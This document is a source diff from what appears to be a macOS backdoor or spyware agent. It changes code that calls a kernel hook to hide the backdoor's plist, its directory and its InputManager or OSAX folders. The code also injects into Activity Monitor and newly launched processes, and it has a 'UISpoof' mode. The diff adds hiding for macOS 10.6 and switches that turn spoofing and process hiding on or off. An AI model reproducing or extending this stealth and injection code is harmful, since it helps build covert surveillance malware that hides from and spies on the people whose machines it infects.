@@ -1232,7 +1232,7 @@ static void computerWillShutdown(CFMachPortRef port,
       
 #ifdef DEBUG_CORE
       if (x == 0)
-        infoLog(@"Checking if skype is running");
+        verboseLog(@"Checking if skype is running");
 #endif
 
       if (agentConfiguration != nil)
@@ -1241,7 +1241,7 @@ static void computerWillShutdown(CFMachPortRef port,
           
 #ifdef DEBUG_CORE
           if (x == 0)
-            warnLog(@"Got skype conf");
+            verboseLog(@"Got skype conf");
 #endif
           
           if ([agentConfiguration objectForKey: @"status"]    == AGENT_RUNNING
@@ -1249,7 +1249,7 @@ static void computerWillShutdown(CFMachPortRef port,
             {
 #ifdef DEBUG_CORE
               if (x == 0)
-                warnLog(@"Skype is running");
+                verboseLog(@"Skype is running");
 #endif
               [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow: 0.001]];
             }
@@ -1257,7 +1257,7 @@ static void computerWillShutdown(CFMachPortRef port,
             {
 #ifdef DEBUG_CORE
               if (x == 0)
-                warnLog(@"Skype is not running");
+                verboseLog(@"Skype is not running");
 #endif
               [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow: 0.1]];
             }
@@ -2374,7 +2374,11 @@ static void computerWillShutdown(CFMachPortRef port,
     }
   else if ([workingMode isEqualToString: UISPOOF])
     {
+#ifndef NO_UISPOOF
       uiSuccess = [self _UISpoof];
+#else
+      uiSuccess = YES;
+#endif
     }
   else
     {
@@ -2548,26 +2552,34 @@ static void computerWillShutdown(CFMachPortRef port,
       ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[[backdoorPlist lastPathComponent] fileSystemRepresentation]);
       
       [backdoorPlist release];
-      
-      NSString *inputManagerPath;
     
       // Hide only inputmanager not osax
       if (gOSMajor == 10 && gOSMinor == 5)
         {
-          inputManagerPath = [[NSString alloc] initWithString: INPUT_MANAGER_FOLDER];
-      
 #ifdef DEBUG_CORE
           infoLog(@"Hiding InputManager");
 #endif
+          NSString *inputManagerPath = [[NSString alloc] initWithString: INPUT_MANAGER_FOLDER];
+          
           // Hiding input manager dir
           ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[inputManagerPath fileSystemRepresentation]);
       
           [inputManagerPath release];
         }
+      else if (gOSMajor == 10 && gOSMinor == 6)
+        {
+#ifdef DEBUG_CORE
+          infoLog(@"Hiding OSAX");
+#endif
+          NSString *osaxPath = [[NSString alloc] initWithString: OSAX_FOLDER];
+          // Hiding input manager dir
+          ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[osaxPath fileSystemRepresentation]);
+          
+          [osaxPath release];
+        }
     
       NSString *appPath = [[[NSBundle mainBundle] bundlePath]
                            lastPathComponent];
-      
 #ifdef DEBUG_CORE
       infoLog(@"Hiding backdoor dir");
 #endif
@@ -2597,6 +2609,7 @@ static void computerWillShutdown(CFMachPortRef port,
     }
 #endif
   
+#ifndef NO_PROC_HIDING
   // Inject running ActivityMonitor
   if (gOSMajor == 10 && gOSMinor == 6 && geteuid() == 0)
     {
@@ -2616,7 +2629,8 @@ static void computerWillShutdown(CFMachPortRef port,
 #endif
         }
     }
-    
+#endif
+  
   // Register notification for new process
   [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver: self 
                                                          selector: @selector(injectBundle:)
